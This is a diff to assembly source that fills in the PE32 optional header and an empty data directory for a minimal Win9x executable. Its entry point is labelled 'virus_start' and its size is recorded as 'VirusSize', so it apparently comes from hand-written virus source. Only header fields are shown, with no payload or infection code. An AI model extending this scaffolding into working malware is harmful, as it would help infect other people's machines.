@@ -67,7 +67,55 @@ times 128-($-.IMAGE_DOS_HEADER) db 0
 .SizeOfOptionalHeader dw .OPTIONAL_HEADER_END - .OPTIONAL_HEADER
 .Characteristics dw 810Fh
 .OPTIONAL_HEADER:
-
+    .Magic                      dw 010Bh           ; PE32 Magic
+    .MajorLinkerVersion         db 0x01            ; (Fake) Linker Version
+    .MinorLinkerVersion         db 0x00            ; 
+    .SizeOfCode                 dd _SizeOfCode     ; Total code size
+    .SizeOfInitializedData      dd 0               ; Fat-Free: No initialized data
+    .SizeOfUninitializedData    dd 0               ; Fat-Free: No BSS
+    .AddressOfEntryPoint        dd virus_start - ImageBase ; THE ENTRY POINT (RVA)
+    .BaseOfCode                 dd virus_start - ImageBase ; RVA of code start
+    .BaseOfData                 dd 0               ; (Often ignored in 32-bit flat)
+    .ImageBase                  dd ImageBase       ; 0x400000
+    .SectionAlignment           dd 00001000h       ; 4KB (Win9x requirement)
+    .FileAlignment              dd 00000200h       ; 512 bytes (Standard)
+    .MajorOperatingSystemVersion dw 0004h          ; Windows 4.0 (Win9x)
+    .MinorOperatingSystemVersion dw 0000h
+    .MajorImageVersion          dw 0000h
+    .MinorImageVersion          dw 0000h
+    .MajorSubsystemVersion      dw 0004h          ; Windows 4.0
+    .MinorSubsystemVersion      dw 0000h
+    .Win32VersionValue          dd 0
+    .SizeOfImage                dd _SizeOfImage    ; Total memory footprint
+    .SizeOfHeaders              dd _SizeOfHeaders  ; Offset to virus_start
+    .CheckSum                   dd 0               ; Optional for most EXEs
+    .Subsystem                  dw 0002h           ; IMAGE_SUBSYSTEM_WINDOWS_GUI
+    .DllCharacteristics         dw 0000h
+    .SizeOfStackReserve         dd 00100000h       ; 1MB Stack
+    .SizeOfStackCommit          dd 00001000h       ; 4KB Commit
+    .SizeOfHeapReserve          dd 00100000h       ; 1MB Heap
+    .SizeOfHeapCommit           dd 00001000h       ; 4KB Commit
+    .LoaderFlags                dd 0
+    .NumberOfRvaAndSizes        dd 00000010h       ; Always 16 Data Directories
+.IMAGE_DATA_DIRECTORY:
+    .Export                     dq 0               ; No Exports
+    .Import                     dq 0               ; Fat-Free: No IAT!
+    .Resource                   dq 0               ; No Icons/Dialogs
+    .Exception                  dq 0               ; No SEH Table (we use FS:[0])
+    .Security                   dq 0
+    .Basereloc                  dq 0               ; No Relocations
+    .Debug                      dq 0
+    .Architecture               dq 0
+    .Globalptr                  dq 0
+    .TLS                        dq 0               ; No Thread Local Storage
+    .Load_Config                dq 0
+    .Bound_Import               dq 0
+    .IAT                        dq 0
+    .Delay_Import               dq 0
+    .COM_Descriptor             dq 0
+    .Reserved                   dq 0
+.OPTIONAL_HEADER_END:
+dd VirusSize
 
 ;********************************************
 ; End of Headers *
